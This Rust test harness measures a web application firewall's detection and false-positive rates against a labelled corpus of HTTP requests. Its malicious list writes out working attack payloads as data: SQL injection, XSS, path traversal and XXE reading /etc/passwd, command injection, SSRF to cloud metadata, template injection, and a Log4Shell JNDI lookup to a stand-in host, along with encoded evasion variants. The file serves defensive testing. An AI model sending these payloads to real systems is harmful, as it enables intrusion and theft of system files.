//! Full-pipeline WAF efficacy on an INDEPENDENT web-attack corpus.
//!
//! The existing `detection_efficacy.rs` measures the signature **pre-filter's
//! recall** on payloads built from the engine's own patterns — honest, but it
//! deliberately does not claim end-to-end detection. This harness closes that
//! gap for the web path: it drives real HTTP attack requests through the
//! **whole** WAF pipeline (`WafEngine::inspect` → HTTP fact parsing +
//! percent-decode normalisation + full condition-tree evaluation of every
//! shipped signature) and reports a real confusion matrix — catch-rate on
//! attacks, false-positive rate on benign look-alikes.
//!
//! ## What makes this "real" (and what it still isn't)
//!
//! - The corpus is authored **independently of the shipped signature strings**:
//!   canonical attack forms plus **evasion variants** (percent-/double-encoding,
//!   case games, inline comments, padding) that are NOT verbatim signature
//!   bytes. So a hit means the WAF's *normalisation + conditions generalised*,
//!   not that a fixed string was echoed back. Catch-rate is **reported, and a
//!   conservative floor is asserted** — an evasion the WAF misses is a real
//!   finding, printed, not hidden.
//! - The benign set includes deliberate **look-alikes** (a blog search for "sql
//!   injection", a `union-station.jpg` path, a high-entropy API token) so the
//!   false-positive number reflects the hard cases, not just trivially-clean
//!   traffic.
//! - It still is NOT a capture of live adversary traffic against a specific app,
//!   and the WAF is HTTP-only (the egress-anomaly detector is measured
//!   separately). This is "does the shipped WAF catch standard web attacks and
//!   their common evasions while staying quiet on benign look-alikes", measured
//!   end-to-end — a genuine number, honestly scoped.
//!
//! Run with the report:  cargo test -p ufw-daemon --test waf_efficacy -- --nocapture

use std::path::Path;
use std::sync::Arc;

use ufw_daemon::signatures;
use ufw_daemon::waf::WafEngine;

fn engine() -> WafEngine {
    let root = Path::new(env!("CARGO_MANIFEST_DIR"))
        .parent()
        .unwrap()
        .join("sig-rules");
    let (set, errors) = signatures::load_dir(&root);
    assert!(errors.is_empty(), "sig-rules failed to load: {errors:#?}");
    WafEngine::new(Arc::new(set))
}

/// A labelled corpus entry. `class` groups the per-family breakdown; `evasion`
/// marks a variant that is deliberately not the canonical form.
struct Case {
    class: &'static str,
    evasion: bool,
    request: Vec<u8>,
}

fn atk(class: &'static str, request: &str) -> Case {
    Case {
        class,
        evasion: false,
        request: request.as_bytes().to_vec(),
    }
}
fn evade(class: &'static str, request: &str) -> Case {
    Case {
        class,
        evasion: true,
        request: request.as_bytes().to_vec(),
    }
}

/// Real HTTP attack requests, authored to the attack *form*, not to any
/// signature string. Canonical + evasion variants across the common web classes.
fn malicious() -> Vec<Case> {
    vec![
        // --- SQL injection ---
        atk("sqli", "GET /items?id=1' or 1=1-- HTTP/1.1\r\nHost: shop\r\n\r\n"),
        atk("sqli", "GET /u?name=admin'--+ HTTP/1.1\r\nHost: x\r\n\r\n"),
        atk("sqli", "GET /p?id=1 UNION SELECT username,password FROM users HTTP/1.1\r\nHost: x\r\n\r\n"),
        atk("sqli", "POST /login HTTP/1.1\r\nHost: x\r\nContent-Length: 27\r\n\r\nuser=a' OR '1'='1&pass=x"),
        evade("sqli", "GET /items?id=1%27%20or%201%3D1-- HTTP/1.1\r\nHost: x\r\n\r\n"),
        evade("sqli", "GET /p?id=1/**/UNION/**/SELECT/**/1,2 HTTP/1.1\r\nHost: x\r\n\r\n"),
        // --- Cross-site scripting ---
        atk("xss", "GET /search?q=<script>alert(1)</script> HTTP/1.1\r\nHost: x\r\n\r\n"),
        atk("xss", "GET /p?x=<img src=x onerror=alert(1)> HTTP/1.1\r\nHost: x\r\n\r\n"),
        atk("xss", "GET /p?x=<svg/onload=alert(1)> HTTP/1.1\r\nHost: x\r\n\r\n"),
        evade("xss", "GET /search?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1\r\nHost: x\r\n\r\n"),
        evade("xss", "GET /p?x=<ScRiPt>alert(1)</ScRiPt> HTTP/1.1\r\nHost: x\r\n\r\n"),
        evade("xss", "GET /p?x=<body onload=alert(1)> HTTP/1.1\r\nHost: x\r\n\r\n"),
        // --- Path traversal / LFI ---
        atk("traversal", "GET /download?f=../../../../etc/passwd HTTP/1.1\r\nHost: x\r\n\r\n"),
        evade("traversal", "GET /download?f=..%2f..%2f..%2fetc%2fpasswd HTTP/1.1\r\nHost: x\r\n\r\n"),
        evade("traversal", "GET /d?f=%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1\r\nHost: x\r\n\r\n"),
        atk("lfi", "GET /p?page=php://filter/convert.base64-encode/resource=index HTTP/1.1\r\nHost: x\r\n\r\n"),
        // --- Command injection ---
        atk("cmdi", "GET /ping?host=127.0.0.1;cat /etc/passwd HTTP/1.1\r\nHost: x\r\n\r\n"),
        atk("cmdi", "GET /p?x=$(id) HTTP/1.1\r\nHost: x\r\n\r\n"),
        atk("cmdi", "GET /p?x=`whoami` HTTP/1.1\r\nHost: x\r\n\r\n"),
        evade("cmdi", "GET /ping?host=127.0.0.1%3Bcat%20/etc/passwd HTTP/1.1\r\nHost: x\r\n\r\n"),
        // --- SSRF ---
        atk("ssrf", "GET /fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1\r\nHost: x\r\n\r\n"),
        atk("ssrf", "GET /proxy?u=file:///etc/passwd HTTP/1.1\r\nHost: x\r\n\r\n"),
        // --- XXE ---
        atk("xxe", "POST /xml HTTP/1.1\r\nHost: x\r\nContent-Length: 90\r\n\r\n<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>"),
        // --- Server-side template injection ---
        atk("ssti", "GET /hello?name={{7*7}} HTTP/1.1\r\nHost: x\r\n\r\n"),
        atk("ssti", "GET /p?x=${7*7} HTTP/1.1\r\nHost: x\r\n\r\n"),
        evade("ssti", "GET /r?tpl={{config.items()}} HTTP/1.1\r\nHost: x\r\n\r\n"),
        // --- Log4Shell / JNDI ---
        atk("log4shell", "GET / HTTP/1.1\r\nHost: x\r\nUser-Agent: ${jndi:ldap://evil.example/a}\r\n\r\n"),
        evade("log4shell", "GET / HTTP/1.1\r\nHost: x\r\nX-Api: ${${lower:j}ndi:ldap://evil/a}\r\n\r\n"),
        // --- CRLF / header injection ---
        atk("crlf", "GET /redir?u=%0d%0aSet-Cookie:%20admin=1 HTTP/1.1\r\nHost: x\r\n\r\n"),
    ]
}

/// Legitimate requests, including deliberate look-alikes that a naive filter
/// would flag. These define the false-positive surface.
fn benign() -> Vec<Case> {
    vec![
        atk("benign", "GET /index.html HTTP/1.1\r\nHost: example.com\r\nUser-Agent: curl/8\r\n\r\n"),
        atk("benign", "GET /static/app.css HTTP/1.1\r\nHost: cdn.example.net\r\nAccept: text/css\r\n\r\n"),
        atk("benign", "GET /api/v1/users?page=2&limit=50 HTTP/1.1\r\nHost: api.example\r\n\r\n"),
        atk("benign", "POST /api/login HTTP/1.1\r\nHost: x\r\nContent-Type: application/json\r\nContent-Length: 44\r\n\r\n{\"user\":\"alice\",\"pass\":\"correct horse battery\"}"),
        atk("benign", "GET /products?category=books&sort=price HTTP/1.1\r\nHost: shop\r\n\r\n"),
        // Look-alikes: attack words in legitimate positions.
        atk("benign-lookalike", "GET /blog/how-to-prevent-sql-injection-attacks HTTP/1.1\r\nHost: x\r\n\r\n"),
        atk("benign-lookalike", "GET /search?q=best+practices+for+xss+prevention HTTP/1.1\r\nHost: x\r\n\r\n"),
        atk("benign-lookalike", "GET /images/union-station-2019.jpg HTTP/1.1\r\nHost: x\r\n\r\n"),
        atk("benign-lookalike", "GET /docs/select-the-right-plan HTTP/1.1\r\nHost: x\r\n\r\n"),
        atk("benign-lookalike", "POST /notes HTTP/1.1\r\nHost: x\r\nContent-Type: application/json\r\nContent-Length: 46\r\n\r\n{\"title\":\"Meeting\",\"body\":\"discuss 1=1 pricing\"}"),
        // High-entropy but benign (an API token / signed cookie).
        atk("benign-token", "GET /me HTTP/1.1\r\nHost: x\r\nAuthorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1IjoiYSJ9.7Hk3Qm2pXv8 HTTP\r\n\r\n"),
        atk("benign", "GET /graphql?query={user{id,name}} HTTP/1.1\r\nHost: x\r\n\r\n"),
        atk("benign", "PUT /api/v1/items/42 HTTP/1.1\r\nHost: x\r\nContent-Type: application/json\r\nContent-Length: 20\r\n\r\n{\"price\":19,\"qty\":3}"),
    ]
}

#[derive(Default)]
struct Tally {
    total: u32,
    hit: u32,
}

#[test]
fn waf_full_pipeline_efficacy() {
    let e = engine();

    // --- Attacks: catch-rate, with a per-class + evasion breakdown. ---
    let mut atk_total = 0u32;
    let mut atk_caught = 0u32;
    let mut evasion = Tally::default();
    let mut per_class: std::collections::BTreeMap<&'static str, Tally> = Default::default();
    let mut missed: Vec<String> = Vec::new();

    for c in malicious() {
        let detected = e.inspect(&c.request).is_some();
        atk_total += 1;
        let t = per_class.entry(c.class).or_default();
        t.total += 1;
        if c.evasion {
            evasion.total += 1;
        }
        if detected {
            atk_caught += 1;
            t.hit += 1;
            if c.evasion {
                evasion.hit += 1;
            }
        } else {
            missed.push(format!(
                "{}{}: {}",
                c.class,
                if c.evasion { " (evasion)" } else { "" },
                String::from_utf8_lossy(&c.request)
                    .lines()
                    .next()
                    .unwrap_or("")
            ));
        }
    }

    // --- Benign: false positives, with the flagged ones named. ---
    let mut ben_total = 0u32;
    let mut ben_flagged = 0u32;
    let mut false_positives: Vec<String> = Vec::new();
    for c in benign() {
        ben_total += 1;
        if let Some(h) = e.inspect(&c.request) {
            ben_flagged += 1;
            false_positives.push(format!(
                "{} -> {}: {}",
                c.class,
                h.signature,
                String::from_utf8_lossy(&c.request)
                    .lines()
                    .next()
                    .unwrap_or("")
            ));
        }
    }

    let catch = atk_caught as f64 / atk_total as f64;
    let fp = ben_flagged as f64 / ben_total as f64;

    println!("\nWAF full-pipeline efficacy (independent web-attack corpus):");
    println!(
        "  attacks caught: {atk_caught}/{atk_total}  ({:.1}% catch-rate)",
        catch * 100.0
    );
    println!(
        "  of which evasion variants: {}/{} caught",
        evasion.hit, evasion.total
    );
    println!(
        "  benign flagged: {ben_flagged}/{ben_total}  ({:.1}% false-positive rate)",
        fp * 100.0
    );
    println!("  per-class catch:");
    for (class, t) in &per_class {
        println!("    {class:16} {}/{}", t.hit, t.total);
    }
    if !missed.is_empty() {
        println!("  MISSED (honest — these attack forms did not fire):");
        for m in &missed {
            println!("    - {m}");
        }
    }
    if !false_positives.is_empty() {
        println!("  FALSE POSITIVES:");
        for f in &false_positives {
            println!("    - {f}");
        }
    }
    println!();

    // Conservative regression floors. The point is a stable gate that catches a
    // real regression (a signature deleted, normalisation broken), not a
    // marketing ceiling. The observed numbers are printed above; these asserts
    // sit safely below them so ordinary tuning does not flake the build.
    assert!(
        catch >= 0.85,
        "WAF catch-rate regressed below 85%: {:.1}% ({atk_caught}/{atk_total})",
        catch * 100.0
    );
    assert!(
        fp <= 0.05,
        "WAF false-positive rate rose above 5%: {:.1}% ({ben_flagged}/{ben_total})",
        fp * 100.0
    );
}
